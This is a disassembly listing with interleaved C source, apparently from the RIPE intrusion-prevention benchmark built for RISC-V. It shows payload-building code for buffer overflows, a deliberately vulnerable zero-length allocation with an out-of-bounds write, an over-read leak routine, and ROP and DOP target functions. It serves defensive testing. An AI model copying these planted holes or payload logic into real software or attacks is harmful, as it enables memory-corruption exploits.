80000ba6:	c63a                	sw	a4,12(sp)
80000ba8:	4701                	li	a4,0
    printf("success.\nROP function reached.\n");
80000baa:	80007537          	lui	a0,0x80007
80000bae:	28450513          	addi	a0,a0,644 # 80007284 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007285>
80000bb2:	01f010ef          	jal	ra,800023d0 <printk>
    exit(0);
80000bb6:	4501                	li	a0,0
80000bb8:	6a4050ef          	jal	ra,8000625c <exit>

80000bbc <hex_to_bin>:
*/
void build_shellcode(char *shellcode);
void hex_to_string(char *str, size_t val);
void format_instruction(char *dest, size_t insn);

const char *hex_to_bin(char c) {
80000bbc:	1101                	addi	sp,sp,-32
80000bbe:	ce06                	sw	ra,28(sp)
80000bc0:	8000c7b7          	lui	a5,0x8000c
80000bc4:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80000bc8:	c63a                	sw	a4,12(sp)
80000bca:	4701                	li	a4,0
	if (c >= '0' && c <= '9') return bin4b[c - '0'];
80000bcc:	fd050793          	addi	a5,a0,-48
80000bd0:	0ff7f793          	zext.b	a5,a5
80000bd4:	4725                	li	a4,9
80000bd6:	02f77d63          	bgeu	a4,a5,80000c10 <hex_to_bin+0x54>
	if (c >= 'a' && c <= 'f') return bin4b[10 + c - 'a'];
80000bda:	f9f50793          	addi	a5,a0,-97
80000bde:	0ff7f793          	zext.b	a5,a5
80000be2:	4715                	li	a4,5
80000be4:	04f76063          	bltu	a4,a5,80000c24 <hex_to_bin+0x68>
80000be8:	fa950513          	addi	a0,a0,-87
80000bec:	8000c7b7          	lui	a5,0x8000c
80000bf0:	050a                	slli	a0,a0,0x2
80000bf2:	eac78793          	addi	a5,a5,-340 # 8000beac <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000bead>
80000bf6:	97aa                	add	a5,a5,a0
80000bf8:	4388                	lw	a0,0(a5)
	return NULL;
}
80000bfa:	8000c7b7          	lui	a5,0x8000c
80000bfe:	4732                	lw	a4,12(sp)
80000c00:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80000c04:	8fb9                	xor	a5,a5,a4
80000c06:	4701                	li	a4,0
80000c08:	e385                	bnez	a5,80000c28 <hex_to_bin+0x6c>
80000c0a:	40f2                	lw	ra,28(sp)
80000c0c:	6105                	addi	sp,sp,32
80000c0e:	8082                	ret
	if (c >= '0' && c <= '9') return bin4b[c - '0'];
80000c10:	fd050513          	addi	a0,a0,-48
80000c14:	8000c7b7          	lui	a5,0x8000c
80000c18:	050a                	slli	a0,a0,0x2
80000c1a:	eac78793          	addi	a5,a5,-340 # 8000beac <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000bead>
80000c1e:	97aa                	add	a5,a5,a0
80000c20:	4388                	lw	a0,0(a5)
80000c22:	bfe1                	j	80000bfa <hex_to_bin+0x3e>
	return NULL;
80000c24:	4501                	li	a0,0
80000c26:	bfd1                	j	80000bfa <hex_to_bin+0x3e>
}
80000c28:	0ca050ef          	jal	ra,80005cf2 <_StackCheckHandler>

80000c2c <print_current_test_parameters>:
print_current_test_parameters(void) {
80000c2c:	1101                	addi	sp,sp,-32
80000c2e:	ce06                	sw	ra,28(sp)
80000c30:	cc22                	sw	s0,24(sp)
80000c32:	8000c437          	lui	s0,0x8000c
80000c36:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80000c3a:	c63e                	sw	a5,12(sp)
80000c3c:	4781                	li	a5,0
    printk("RIPE parameters:\n");
80000c3e:	80007537          	lui	a0,0x80007
80000c42:	2a450513          	addi	a0,a0,676 # 800072a4 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800072a5>
80000c46:	78a010ef          	jal	ra,800023d0 <printk>
        opt_techniques[attack.technique-100],
80000c4a:	800097b7          	lui	a5,0x80009
80000c4e:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80000c52:	4388                	lw	a0,0(a5)
80000c54:	f9c50513          	addi	a0,a0,-100
        opt_inject_params[attack.inject_param-200],
80000c58:	43cc                	lw	a1,4(a5)
80000c5a:	f3858593          	addi	a1,a1,-200
        opt_code_ptrs[attack.code_ptr-300],
80000c5e:	4790                	lw	a2,8(a5)
80000c60:	ed460613          	addi	a2,a2,-300
        opt_locations[attack.location-400],
80000c64:	47d4                	lw	a3,12(a5)
80000c66:	e7068693          	addi	a3,a3,-400
        opt_funcs[attack.function-500]);
80000c6a:	4b98                	lw	a4,16(a5)
80000c6c:	e0c70713          	addi	a4,a4,-500
	printk("technique\t%s\n"
80000c70:	8000c7b7          	lui	a5,0x8000c
80000c74:	070a                	slli	a4,a4,0x2
80000c76:	eec78793          	addi	a5,a5,-276 # 8000beec <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000beed>
80000c7a:	97ba                	add	a5,a5,a4
80000c7c:	8000c737          	lui	a4,0x8000c
80000c80:	068a                	slli	a3,a3,0x2
80000c82:	f1070713          	addi	a4,a4,-240 # 8000bf10 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000bf11>
80000c86:	9736                	add	a4,a4,a3
80000c88:	8000c6b7          	lui	a3,0x8000c
80000c8c:	060a                	slli	a2,a2,0x2
80000c8e:	f2068693          	addi	a3,a3,-224 # 8000bf20 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000bf21>
80000c92:	96b2                	add	a3,a3,a2
80000c94:	8000c637          	lui	a2,0x8000c
80000c98:	058a                	slli	a1,a1,0x2
80000c9a:	f6860613          	addi	a2,a2,-152 # 8000bf68 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000bf69>
80000c9e:	962e                	add	a2,a2,a1
80000ca0:	050a                	slli	a0,a0,0x2
80000ca2:	81418593          	addi	a1,gp,-2028 # 8000bffc <opt_techniques>
80000ca6:	95aa                	add	a1,a1,a0
80000ca8:	439c                	lw	a5,0(a5)
80000caa:	4318                	lw	a4,0(a4)
80000cac:	4294                	lw	a3,0(a3)
80000cae:	4210                	lw	a2,0(a2)
80000cb0:	418c                	lw	a1,0(a1)
80000cb2:	80007537          	lui	a0,0x80007
80000cb6:	2b850513          	addi	a0,a0,696 # 800072b8 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800072b9>
80000cba:	716010ef          	jal	ra,800023d0 <printk>
}
80000cbe:	4732                	lw	a4,12(sp)
80000cc0:	95042783          	lw	a5,-1712(s0)
80000cc4:	8fb9                	xor	a5,a5,a4
80000cc6:	4701                	li	a4,0
80000cc8:	e789                	bnez	a5,80000cd2 <print_current_test_parameters+0xa6>
80000cca:	40f2                	lw	ra,28(sp)
80000ccc:	4462                	lw	s0,24(sp)
80000cce:	6105                	addi	sp,sp,32
80000cd0:	8082                	ret
80000cd2:	020050ef          	jal	ra,80005cf2 <_StackCheckHandler>

80000cd6 <build_payload>:
{
80000cd6:	1101                	addi	sp,sp,-32
80000cd8:	ce06                	sw	ra,28(sp)
80000cda:	cc22                	sw	s0,24(sp)
80000cdc:	ca26                	sw	s1,20(sp)
80000cde:	c84a                	sw	s2,16(sp)
80000ce0:	842a                	mv	s0,a0
80000ce2:	8000c7b7          	lui	a5,0x8000c
80000ce6:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80000cea:	c63a                	sw	a4,12(sp)
80000cec:	4701                	li	a4,0
	switch (attack.inject_param) {
80000cee:	800097b7          	lui	a5,0x80009
80000cf2:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80000cf6:	43dc                	lw	a5,4(a5)
80000cf8:	0ca00713          	li	a4,202
80000cfc:	02f76463          	bltu	a4,a5,80000d24 <build_payload+0x4e>
80000d00:	0c900713          	li	a4,201
80000d04:	04e7f163          	bgeu	a5,a4,80000d46 <build_payload+0x70>
80000d08:	0c800713          	li	a4,200
80000d0c:	04e79663          	bne	a5,a4,80000d58 <build_payload+0x82>
            if (payload->size < (size_shellcode_nonop + sizeof(long))) {
80000d10:	4158                	lw	a4,4(a0)
80000d12:	47bd                	li	a5,15
80000d14:	12e7fd63          	bgeu	a5,a4,80000e4e <build_payload+0x178>
            shellcode      = shellcode_nonop;
80000d18:	800094b7          	lui	s1,0x80009
80000d1c:	4f048493          	addi	s1,s1,1264 # 800094f0 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094f1>
            size_shellcode = size_shellcode_nonop;
80000d20:	4931                	li	s2,12
80000d22:	a81d                	j	80000d58 <build_payload+0x82>
	switch (attack.inject_param) {
80000d24:	0cb00713          	li	a4,203
80000d28:	02e79863          	bne	a5,a4,80000d58 <build_payload+0x82>
            if (attack.code_ptr == VAR_IOF)
80000d2c:	800097b7          	lui	a5,0x80009
80000d30:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80000d34:	479c                	lw	a5,8(a5)
80000d36:	13c00713          	li	a4,316
80000d3a:	0ce78763          	beq	a5,a4,80000e08 <build_payload+0x132>
			if (attack.code_ptr == VAR_LEAK) {
80000d3e:	13d00713          	li	a4,317
80000d42:	0ce78763          	beq	a5,a4,80000e10 <build_payload+0x13a>
            if (payload->size < sizeof(long))
80000d46:	4058                	lw	a4,4(s0)
80000d48:	478d                	li	a5,3
80000d4a:	10e7f463          	bgeu	a5,a4,80000e52 <build_payload+0x17c>
            shellcode      = "dummy";
80000d4e:	800074b7          	lui	s1,0x80007
80000d52:	30048493          	addi	s1,s1,768 # 80007300 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007301>
            size_shellcode = 0;
80000d56:	4901                	li	s2,0
    payload->buffer = (char *) malloc(payload->size);
80000d58:	4048                	lw	a0,4(s0)
80000d5a:	52e050ef          	jal	ra,80006288 <malloc>
80000d5e:	c448                	sw	a0,12(s0)
    if (payload->buffer == NULL) {
80000d60:	cd79                	beqz	a0,80000e3e <build_payload+0x168>
__ ## fun ## _ichk(type1 __restrict dst, type2 __restrict src) { \
	return __builtin___ ## fun ## _chk(dst, src, __ssp_bos0(dst)); \
}

__BEGIN_DECLS
__ssp_bos_icheck3_restrict(memcpy, void *, const void *)
80000d62:	864a                	mv	a2,s2
80000d64:	85a6                	mv	a1,s1
80000d66:	3461                	jal	800007ee <memcpy>
      (payload->size - size_shellcode - sizeof(long) - sizeof(char));
80000d68:	4044                	lw	s1,4(s0)
80000d6a:	412484b3          	sub	s1,s1,s2
    bytes_to_pad =
80000d6e:	14ed                	addi	s1,s1,-5
    memset((payload->buffer + size_shellcode), 'A', bytes_to_pad);
80000d70:	4448                	lw	a0,12(s0)
__ssp_bos_icheck3(memmove, void *, const void *)
__ssp_bos_icheck3_restrict(mempcpy, void *, const void *)
__ssp_bos_icheck3(memset, void *, int)
80000d72:	8626                	mv	a2,s1
80000d74:	04100593          	li	a1,65
80000d78:	954a                	add	a0,a0,s2
80000d7a:	3469                	jal	80000804 <memset>
        fprintf(stderr, "bytes to pad: %d\n", bytes_to_pad);
80000d7c:	85a6                	mv	a1,s1
80000d7e:	80007537          	lui	a0,0x80007
80000d82:	32c50513          	addi	a0,a0,812 # 8000732c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000732d>
80000d86:	64a010ef          	jal	ra,800023d0 <printk>
        fprintf(stderr, "\noverflow_ptr: %p\n", payload->overflow_ptr);
80000d8a:	440c                	lw	a1,8(s0)
80000d8c:	80007537          	lui	a0,0x80007
80000d90:	34050513          	addi	a0,a0,832 # 80007340 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007341>
80000d94:	63c010ef          	jal	ra,800023d0 <printk>
    if (attack.code_ptr != VAR_IOF) {
80000d98:	800097b7          	lui	a5,0x80009
80000d9c:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80000da0:	4798                	lw	a4,8(a5)
80000da2:	13c00793          	li	a5,316
80000da6:	02f70563          	beq	a4,a5,80000dd0 <build_payload+0xfa>
        memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
80000daa:	445c                	lw	a5,12(s0)
80000dac:	9926                	add	s2,s2,s1
80000dae:	97ca                	add	a5,a5,s2
__ssp_bos_icheck3_restrict(memcpy, void *, const void *)
80000db0:	00844583          	lbu	a1,8(s0)
80000db4:	00944603          	lbu	a2,9(s0)
80000db8:	00a44683          	lbu	a3,10(s0)
80000dbc:	00b44703          	lbu	a4,11(s0)
80000dc0:	00b78023          	sb	a1,0(a5)
80000dc4:	00c780a3          	sb	a2,1(a5)
80000dc8:	00d78123          	sb	a3,2(a5)
80000dcc:	00e781a3          	sb	a4,3(a5)
    memset((payload->buffer + payload->size - 1), '\0', 1);
80000dd0:	445c                	lw	a5,12(s0)
80000dd2:	4058                	lw	a4,4(s0)
80000dd4:	177d                	addi	a4,a4,-1
80000dd6:	97ba                	add	a5,a5,a4
__ssp_bos_icheck3(memset, void *, int)
80000dd8:	00078023          	sb	zero,0(a5)
        fprintf(stderr, "payload: %s\n", payload->buffer);
80000ddc:	444c                	lw	a1,12(s0)
80000dde:	80007537          	lui	a0,0x80007
80000de2:	35450513          	addi	a0,a0,852 # 80007354 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007355>
80000de6:	5ea010ef          	jal	ra,800023d0 <printk>
    return TRUE;
80000dea:	4505                	li	a0,1
} /* build_payload */
80000dec:	8000c7b7          	lui	a5,0x8000c
80000df0:	4732                	lw	a4,12(sp)
80000df2:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80000df6:	8fb9                	xor	a5,a5,a4
80000df8:	4701                	li	a4,0
80000dfa:	efb1                	bnez	a5,80000e56 <build_payload+0x180>
80000dfc:	40f2                	lw	ra,28(sp)
80000dfe:	4462                	lw	s0,24(sp)
80000e00:	44d2                	lw	s1,20(sp)
80000e02:	4942                	lw	s2,16(sp)
80000e04:	6105                	addi	sp,sp,32
80000e06:	8082                	ret
                payload->size = 256 + sizeof(long) + sizeof(char);
80000e08:	10500713          	li	a4,261
80000e0c:	c158                	sw	a4,4(a0)
80000e0e:	bf05                	j	80000d3e <build_payload+0x68>
				payload->size += 32 - sizeof(long);
80000e10:	405c                	lw	a5,4(s0)
80000e12:	07f1                	addi	a5,a5,28
80000e14:	c05c                	sw	a5,4(s0)
				payload->buffer[0] = payload->size & 0xFF;
80000e16:	4458                	lw	a4,12(s0)
80000e18:	00f70023          	sb	a5,0(a4)
				payload->buffer[1] = payload->size / 0x100;
80000e1c:	405c                	lw	a5,4(s0)
80000e1e:	83a1                	srli	a5,a5,0x8
80000e20:	4458                	lw	a4,12(s0)
80000e22:	00f700a3          	sb	a5,1(a4)
				payload->buffer[2] = 'A';
80000e26:	445c                	lw	a5,12(s0)
80000e28:	04100713          	li	a4,65
80000e2c:	00e78123          	sb	a4,2(a5)
				payload->buffer[3] = '\0';
80000e30:	445c                	lw	a5,12(s0)
80000e32:	000781a3          	sb	zero,3(a5)
				payload->size = 4;
80000e36:	4791                	li	a5,4
80000e38:	c05c                	sw	a5,4(s0)
				return TRUE;
80000e3a:	4505                	li	a0,1
80000e3c:	bf45                	j	80000dec <build_payload+0x116>
            printk("Unable to allocate payload buffer.");
80000e3e:	80007537          	lui	a0,0x80007
80000e42:	30850513          	addi	a0,a0,776 # 80007308 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007309>
80000e46:	58a010ef          	jal	ra,800023d0 <printk>
        return FALSE;
80000e4a:	4501                	li	a0,0
80000e4c:	b745                	j	80000dec <build_payload+0x116>
                return FALSE;
80000e4e:	4501                	li	a0,0
80000e50:	bf71                	j	80000dec <build_payload+0x116>
                return FALSE;
80000e52:	4501                	li	a0,0
80000e54:	bf61                	j	80000dec <build_payload+0x116>
} /* build_payload */
80000e56:	69d040ef          	jal	ra,80005cf2 <_StackCheckHandler>

80000e5a <lj_func>:
{
80000e5a:	1101                	addi	sp,sp,-32
80000e5c:	ce06                	sw	ra,28(sp)
80000e5e:	8000c7b7          	lui	a5,0x8000c
80000e62:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80000e66:	c63a                	sw	a4,12(sp)
80000e68:	4701                	li	a4,0
    longjmp(lj_buf, 1111);
80000e6a:	45700593          	li	a1,1111
80000e6e:	3af9                	jal	8000084c <longjmp>

80000e70 <homebrew_memcpy>:
{
80000e70:	1101                	addi	sp,sp,-32
80000e72:	ce06                	sw	ra,28(sp)
80000e74:	8000c7b7          	lui	a5,0x8000c
80000e78:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80000e7c:	c63a                	sw	a4,12(sp)
80000e7e:	4701                	li	a4,0
    while (length--) {
80000e80:	a801                	j	80000e90 <homebrew_memcpy+0x20>
        *d++ = *s++;
80000e82:	0005c703          	lbu	a4,0(a1)
80000e86:	00e50023          	sb	a4,0(a0)
80000e8a:	0585                	addi	a1,a1,1
80000e8c:	0505                	addi	a0,a0,1
    while (length--) {
80000e8e:	863e                	mv	a2,a5
80000e90:	fff60793          	addi	a5,a2,-1
80000e94:	f67d                	bnez	a2,80000e82 <homebrew_memcpy+0x12>
}
80000e96:	8000c7b7          	lui	a5,0x8000c
80000e9a:	4732                	lw	a4,12(sp)
80000e9c:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80000ea0:	8fb9                	xor	a5,a5,a4
80000ea2:	4701                	li	a4,0
80000ea4:	e781                	bnez	a5,80000eac <homebrew_memcpy+0x3c>
80000ea6:	40f2                	lw	ra,28(sp)
80000ea8:	6105                	addi	sp,sp,32
80000eaa:	8082                	ret
80000eac:	647040ef          	jal	ra,80005cf2 <_StackCheckHandler>

80000eb0 <set_low_buf>:
}

void
set_low_buf(char ** buf)
{
80000eb0:	be010113          	addi	sp,sp,-1056
80000eb4:	40112e23          	sw	ra,1052(sp)
80000eb8:	40812c23          	sw	s0,1048(sp)
80000ebc:	40912a23          	sw	s1,1044(sp)
80000ec0:	842a                	mv	s0,a0
80000ec2:	8000c4b7          	lui	s1,0x8000c
80000ec6:	9504a783          	lw	a5,-1712(s1) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80000eca:	40f12623          	sw	a5,1036(sp)
80000ece:	4781                	li	a5,0
    char low_buf[1024];

    if (output_debug_info)
        fprintf(stderr, "Inside set_low_buf()\n");
80000ed0:	80007537          	lui	a0,0x80007
80000ed4:	36450513          	addi	a0,a0,868 # 80007364 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007365>
80000ed8:	4f8010ef          	jal	ra,800023d0 <printk>
    *buf = &low_buf;
80000edc:	007c                	addi	a5,sp,12
80000ede:	c01c                	sw	a5,0(s0)
}
80000ee0:	40c12703          	lw	a4,1036(sp)
80000ee4:	9504a783          	lw	a5,-1712(s1)
80000ee8:	8fb9                	xor	a5,a5,a4
80000eea:	4701                	li	a4,0
80000eec:	eb91                	bnez	a5,80000f00 <set_low_buf+0x50>
80000eee:	41c12083          	lw	ra,1052(sp)
80000ef2:	41812403          	lw	s0,1048(sp)
80000ef6:	41412483          	lw	s1,1044(sp)
80000efa:	42010113          	addi	sp,sp,1056
80000efe:	8082                	ret
80000f00:	5f3040ef          	jal	ra,80005cf2 <_StackCheckHandler>

80000f04 <iof>:

void
iof(char * buf, uint32_t iv)
{
80000f04:	1101                	addi	sp,sp,-32
80000f06:	ce06                	sw	ra,28(sp)
80000f08:	cc22                	sw	s0,24(sp)
80000f0a:	ca26                	sw	s1,20(sp)
80000f0c:	c84a                	sw	s2,16(sp)
80000f0e:	84ae                	mv	s1,a1
80000f10:	8000c937          	lui	s2,0x8000c
80000f14:	95092783          	lw	a5,-1712(s2) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80000f18:	c63e                	sw	a5,12(sp)
80000f1a:	4781                	li	a5,0
    char * map;
    uint32_t key = iv;
    uint8_t len  = strlen(buf);
80000f1c:	63e050ef          	jal	ra,8000655a <strlen>

    // 0-length allocation and vulenrable hash operations
    map      = (char *) malloc(len * sizeof(char));
80000f20:	0ff57413          	zext.b	s0,a0
80000f24:	8522                	mv	a0,s0
80000f26:	362050ef          	jal	ra,80006288 <malloc>
    key     -= (uint32_t) map;
80000f2a:	8c89                	sub	s1,s1,a0
    key     &= (uint16_t) len - 1;
80000f2c:	147d                	addi	s0,s0,-1
80000f2e:	8c65                	and	s0,s0,s1
    map[key] = 0xa1;
80000f30:	9522                	add	a0,a0,s0
80000f32:	fa100793          	li	a5,-95
80000f36:	00f50023          	sb	a5,0(a0)
}
80000f3a:	4732                	lw	a4,12(sp)
80000f3c:	95092783          	lw	a5,-1712(s2)
80000f40:	8fb9                	xor	a5,a5,a4
80000f42:	4701                	li	a4,0
80000f44:	e799                	bnez	a5,80000f52 <iof+0x4e>
80000f46:	40f2                	lw	ra,28(sp)
80000f48:	4462                	lw	s0,24(sp)
80000f4a:	44d2                	lw	s1,20(sp)
80000f4c:	4942                	lw	s2,16(sp)
80000f4e:	6105                	addi	sp,sp,32
80000f50:	8082                	ret
80000f52:	5a1040ef          	jal	ra,80005cf2 <_StackCheckHandler>

80000f56 <dop_target>:
{
80000f56:	1101                	addi	sp,sp,-32
80000f58:	ce06                	sw	ra,28(sp)
80000f5a:	8000c7b7          	lui	a5,0x8000c
80000f5e:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80000f62:	c63a                	sw	a4,12(sp)
80000f64:	4701                	li	a4,0
    size_t auth_loc = auth;
80000f66:	c42e                	sw	a1,8(sp)
    if (attack.code_ptr == VAR_IOF) {
80000f68:	800097b7          	lui	a5,0x80009
80000f6c:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80000f70:	4798                	lw	a4,8(a5)
80000f72:	13c00793          	li	a5,316
80000f76:	02f70563          	beq	a4,a5,80000fa0 <dop_target+0x4a>
    if (!auth_loc) {
80000f7a:	47a2                	lw	a5,8(sp)
80000f7c:	e78d                	bnez	a5,80000fa6 <dop_target+0x50>
        printf("DOP attack failed\n");
80000f7e:	80007537          	lui	a0,0x80007
80000f82:	37c50513          	addi	a0,a0,892 # 8000737c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000737d>
80000f86:	44a010ef          	jal	ra,800023d0 <printk>
}
80000f8a:	8000c7b7          	lui	a5,0x8000c
80000f8e:	4732                	lw	a4,12(sp)
80000f90:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80000f94:	8fb9                	xor	a5,a5,a4
80000f96:	4701                	li	a4,0
80000f98:	e385                	bnez	a5,80000fb8 <dop_target+0x62>
80000f9a:	40f2                	lw	ra,28(sp)
80000f9c:	6105                	addi	sp,sp,32
80000f9e:	8082                	ret
        iof(buf, &auth_loc);
80000fa0:	002c                	addi	a1,sp,8
80000fa2:	378d                	jal	80000f04 <iof>
80000fa4:	bfd9                	j	80000f7a <dop_target+0x24>
        printf("success.\nDOP memory corruption reached.\n");
80000fa6:	80007537          	lui	a0,0x80007
80000faa:	39050513          	addi	a0,a0,912 # 80007390 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007391>
80000fae:	422010ef          	jal	ra,800023d0 <printk>
        exit(0);
80000fb2:	4501                	li	a0,0
80000fb4:	2a8050ef          	jal	ra,8000625c <exit>
}
80000fb8:	53b040ef          	jal	ra,80005cf2 <_StackCheckHandler>

80000fbc <data_leak>:

void
data_leak(char *buf) {
80000fbc:	1101                	addi	sp,sp,-32
80000fbe:	ce06                	sw	ra,28(sp)
80000fc0:	cc22                	sw	s0,24(sp)
80000fc2:	ca26                	sw	s1,20(sp)
80000fc4:	c84a                	sw	s2,16(sp)
80000fc6:	842a                	mv	s0,a0
80000fc8:	8000c7b7          	lui	a5,0x8000c
80000fcc:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80000fd0:	c63a                	sw	a4,12(sp)
80000fd2:	4701                	li	a4,0
	uint16_t size = buf[0] + (buf[1] * 0x100), i;
80000fd4:	00054483          	lbu	s1,0(a0)
80000fd8:	00154783          	lbu	a5,1(a0)
80000fdc:	07a2                	slli	a5,a5,0x8
80000fde:	94be                	add	s1,s1,a5
80000fe0:	04c2                	slli	s1,s1,0x10
80000fe2:	80c1                	srli	s1,s1,0x10
	char *msg = (char *)malloc(size);
80000fe4:	8526                	mv	a0,s1
80000fe6:	2a2050ef          	jal	ra,80006288 <malloc>
80000fea:	892a                	mv	s2,a0
__ssp_bos_icheck3_restrict(memcpy, void *, const void *)
80000fec:	8626                	mv	a2,s1
80000fee:	00240593          	addi	a1,s0,2
80000ff2:	ffcff0ef          	jal	ra,800007ee <memcpy>
80000ff6:	4401                	li	s0,0
80000ff8:	a021                	j	80001000 <data_leak+0x44>

	memcpy(msg, buf + 2, size);
	for (i = 0; i < size; i++) {
80000ffa:	0405                	addi	s0,s0,1
80000ffc:	0442                	slli	s0,s0,0x10
80000ffe:	8041                	srli	s0,s0,0x10
80001000:	02947063          	bgeu	s0,s1,80001020 <data_leak+0x64>
		if (msg[i] >= 0x20) printf("%c",msg[i]);
80001004:	008907b3          	add	a5,s2,s0
80001008:	0007c583          	lbu	a1,0(a5)
8000100c:	47fd                	li	a5,31
8000100e:	feb7f6e3          	bgeu	a5,a1,80000ffa <data_leak+0x3e>
80001012:	80007537          	lui	a0,0x80007
80001016:	3bc50513          	addi	a0,a0,956 # 800073bc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800073bd>
8000101a:	3b6010ef          	jal	ra,800023d0 <printk>
8000101e:	bff1                	j	80000ffa <data_leak+0x3e>
	}

	printf("\n");
80001020:	80007537          	lui	a0,0x80007
80001024:	37850513          	addi	a0,a0,888 # 80007378 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007379>
80001028:	3a8010ef          	jal	ra,800023d0 <printk>
}			
8000102c:	8000c7b7          	lui	a5,0x8000c
80001030:	4732                	lw	a4,12(sp)
80001032:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80001036:	8fb9                	xor	a5,a5,a4
80001038:	4701                	li	a4,0
8000103a:	e799                	bnez	a5,80001048 <data_leak+0x8c>
8000103c:	40f2                	lw	ra,28(sp)
8000103e:	4462                	lw	s0,24(sp)
80001040:	44d2                	lw	s1,20(sp)
80001042:	4942                	lw	s2,16(sp)
80001044:	6105                	addi	sp,sp,32
80001046:	8082                	ret
80001048:	4ab040ef          	jal	ra,80005cf2 <_StackCheckHandler>

8000104c <hex_to_string>:
} /* build_shellcode */

// convert a 32-bit hex value to padded, 8-char string
void
hex_to_string(char * str, size_t val)
{
8000104c:	1101                	addi	sp,sp,-32
8000104e:	ce06                	sw	ra,28(sp)
80001050:	cc22                	sw	s0,24(sp)
80001052:	842a                	mv	s0,a0
80001054:	86ae                	mv	a3,a1
80001056:	8000c7b7          	lui	a5,0x8000c
8000105a:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000105e:	c63a                	sw	a4,12(sp)
80001060:	4701                	li	a4,0
    // store value in string and prepend 0s as necessary
    snprintf(str, 9, "%8x", val);
80001062:	80007637          	lui	a2,0x80007
80001066:	3c060613          	addi	a2,a2,960 # 800073c0 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800073c1>
8000106a:	45a5                	li	a1,9
8000106c:	3ce050ef          	jal	ra,8000643a <sniprintf>

    for (int i = 0; i < 9; i++) {
80001070:	4781                	li	a5,0
80001072:	a011                	j	80001076 <hex_to_string+0x2a>
80001074:	0785                	addi	a5,a5,1
80001076:	4721                	li	a4,8
80001078:	00f74f63          	blt	a4,a5,80001096 <hex_to_string+0x4a>
        if (str[i] == ' ') str[i] = '0';
8000107c:	00f40733          	add	a4,s0,a5
80001080:	00074603          	lbu	a2,0(a4)
80001084:	02000693          	li	a3,32
80001088:	fed616e3          	bne	a2,a3,80001074 <hex_to_string+0x28>
8000108c:	03000693          	li	a3,48
80001090:	00d70023          	sb	a3,0(a4)
80001094:	b7c5                	j	80001074 <hex_to_string+0x28>
    }
}
80001096:	8000c7b7          	lui	a5,0x8000c
8000109a:	4732                	lw	a4,12(sp)
8000109c:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800010a0:	8fb9                	xor	a5,a5,a4
800010a2:	4701                	li	a4,0
800010a4:	e789                	bnez	a5,800010ae <hex_to_string+0x62>
800010a6:	40f2                	lw	ra,28(sp)
800010a8:	4462                	lw	s0,24(sp)
800010aa:	6105                	addi	sp,sp,32
800010ac:	8082                	ret
800010ae:	445040ef          	jal	ra,80005cf2 <_StackCheckHandler>

800010b2 <format_instruction>:

// format instruction and append to destination string
void
format_instruction(char * dest, size_t insn)
{
800010b2:	1101                	addi	sp,sp,-32
800010b4:	ce06                	sw	ra,28(sp)
